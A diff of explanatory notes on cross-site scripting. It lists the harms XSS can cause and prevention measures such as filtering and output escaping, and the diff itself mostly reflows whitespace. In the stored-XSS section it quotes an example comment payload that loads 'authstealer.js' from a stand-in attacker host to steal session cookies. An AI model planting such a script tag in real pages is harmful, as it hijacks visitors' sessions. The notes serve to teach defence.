@@ -23,7 +23,9 @@ to gather information from the users.
 * Most danger lies on the users of the sites, as the code targets their information 
 and use rather than the website itself. [xss]_ 
 
+
 * Some examples of what dangerous XSS could do include: 
+
 	1. Access session cookies, which can be used to impersonate the user
 	2. Keylogging, which tracks the users keystrokes to catch usernames and passwords
 	3. Phishing, or sending out fake and/or malicious emails
@@ -47,15 +49,14 @@ What Can Be Done to Prevent XSS through Web Security
 	
 * Signiture based Filtering - "identifies and blocks malicious requests" [xss-attacks]_ 
 	
-* Use escape characters -  escape any characters that could change the websites 
-code [xss-prevention]_ 
-		
+* Use escape characters -  escape any characters that could change the websites code [xss-prevention]_ 
+	
 	* PHP Applications can use **htmlentities()** , a built in function for 
 	escaping characters 
 	
 	* Also escape any HTML, attribute, JavaScript, JSON (with HTML), CSS, and URL 
 	before entering any untrusted or unvalidated data [xss_cheat_sheet]_
-		
+	
 * Escape data output, not input - when displaying to user [xss-prevention]_ 
 
 	* "Security researcher Jouko Pynnönen of Klikki Oy realized MySQL column 
@@ -91,10 +92,12 @@ HTML tags. They leave a comment that says:
 "Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>" [xss-attacks]_
 This is a stored in the website, and everytime someone visits the page, they have their 
 session cookies stolen
-	
+
+
 	* Harder for hackers to attempt, because they must find a highly trafficed site that 
 	also has a security hole. [xss-prevention]_
-
+	
+	
 * Reflective XSS: Similar to above, but the user would have to click on the link 
 to activate the code. 
 
